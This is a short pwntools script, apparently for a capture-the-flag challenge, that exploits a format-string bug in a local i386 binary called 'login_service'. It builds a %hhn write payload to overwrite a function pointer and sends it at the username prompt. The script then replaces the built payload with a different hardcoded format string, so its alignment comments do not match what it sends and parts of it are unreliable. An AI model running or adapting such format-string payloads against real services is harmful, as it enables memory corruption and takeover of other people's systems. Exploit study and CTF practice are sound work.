from pwn import *
context.binary = ELF('./login_service')   # i386

FUNC_PTR = 0xffffc99c
OFFSET   = 3          # slot where the first address lands (from your probe)

# 4 addresses = 16 bytes of args. They occupy stack slots OFFSET..OFFSET+3.
addrs  = p32(FUNC_PTR+2) + p32(FUNC_PTR+1) + p32(FUNC_PTR+3) + p32(FUNC_PTR+0)
#           0x9e ->0xad     0x9d ->0xbe      0x9f ->0xde      0x9c ->0xef

# Alignment: "Hello, "(7) + 'A'(1) = 8 already printed before our string starts.
# Our addrs block is 16 bytes => 8 + 16 = 24 chars printed before first %hhn fires.
prefix   = b'A'
written  = 8 + len(addrs)          # 24

# targets in ascending byte value
vals = [0xad, 0xbe, 0xde, 0xef]
fmt  = b''
for i, v in enumerate(vals):
    pad = (v - written) % 256
    if pad:
        fmt += b'%' + str(pad).encode() + b'c'
        written += pad
    fmt += b'%' + str(OFFSET + i).encode() + b'$hhn'

payload = prefix + addrs + fmt
payload = b"%1$26723x%67$n%1$7085x%3$hn%1$33764x%4$hn"
io = process('./login_service')
io.sendlineafter(b'Username:', payload)
print(io.recvall(timeout=2))   # "That was hard, sheesh" => write landed